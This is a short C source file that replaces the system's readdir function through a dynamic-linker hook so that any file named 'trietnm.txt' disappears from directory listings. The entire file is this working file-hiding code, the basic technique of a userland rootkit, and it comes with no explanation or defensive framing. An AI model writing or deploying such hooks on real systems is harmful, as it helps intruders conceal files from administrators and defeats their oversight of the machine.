#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdio.h>

#define FILENAME "trietnm.txt"

int count = 0;

struct dirent *(*original_readdir)(DIR *);
struct dirent *readdir(DIR *dirp) 
{
	struct dirent *ret;

	original_readdir = dlsym (RTLD_NEXT, "readdir");
	while((ret = original_readdir(dirp)))
	{
		count += 1;
		if(strstr(ret->d_name,FILENAME) == NULL) {
			break;
		}
	}
	return ret;
}
